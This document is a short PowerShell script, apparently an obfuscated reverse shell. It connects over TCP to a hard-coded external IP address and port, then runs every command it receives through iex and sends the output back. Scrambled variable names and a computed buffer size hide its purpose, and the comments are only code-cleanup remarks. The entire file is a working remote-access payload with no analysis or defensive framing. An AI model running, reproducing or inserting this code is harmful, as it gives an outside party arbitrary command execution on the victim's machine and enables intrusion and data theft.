$KLK = New-Object System.Net.Sockets.TCPClient('172.232.190.135','9991');
$PLP = $KLK.GetStream();

# You don't need to declare $VVCCA as [byte[]] again here
$VVCCA = ([text.encoding]::UTF8).GetBytes("Successfully connected.`n`n");
$PLP.Write($VVCCA,0,$VVCCA.Length);

# Reassigning $VVCCA should be removed, since it's already declared
$VVCCA = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + ' > ');
$PLP.Write($VVCCA,0,$VVCCA.Length);

# No need to declare $VVCCA as [byte[]] again here
$VVCCA = 0..((2 -shl (3*5)) - 1) | % { 0 };
while (($A = $PLP.Read($VVCCA, 0, $VVCCA.Length)) -ne 0) {
    $DD = (New-Object System.Text.UTF8Encoding).GetString($VVCCA, 0, $A);
    $VZZS = (iex $DD 2>&1 | Out-String);
    $HHHHHH = $VZZS + (Get-Location).Path + '! ';
    $L = ([text.encoding]::UTF8).GetBytes($HHHHHH);
    $PLP.Write($L, 0, $L.Length);
    $PLP.Flush();
}

$KLK.Close();
